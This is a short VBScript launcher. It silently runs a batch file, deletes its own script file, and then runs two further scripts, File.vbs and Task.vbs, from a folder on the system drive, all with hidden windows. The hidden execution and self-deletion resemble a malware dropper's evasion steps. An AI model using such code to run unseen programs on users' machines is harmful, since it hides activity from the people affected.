Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "extract_to_system_drive.bat" & Chr(34), 0
WScript.Sleep 1000 ' Wait for the batch file to start
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile WScript.ScriptFullName ' Delete the .vbs file

' Run File.vbs after extraction
systemDrive = WshShell.ExpandEnvironmentStrings("%SystemDrive%")
WshShell.Run chr(34) & systemDrive & "\TFolder\File.vbs" & Chr(34), 0

systemDrive = WshShell.ExpandEnvironmentStrings("%SystemDrive%")
WshShell.Run chr(34) & systemDrive & "\TFolder\Task.vbs" & Chr(34), 0



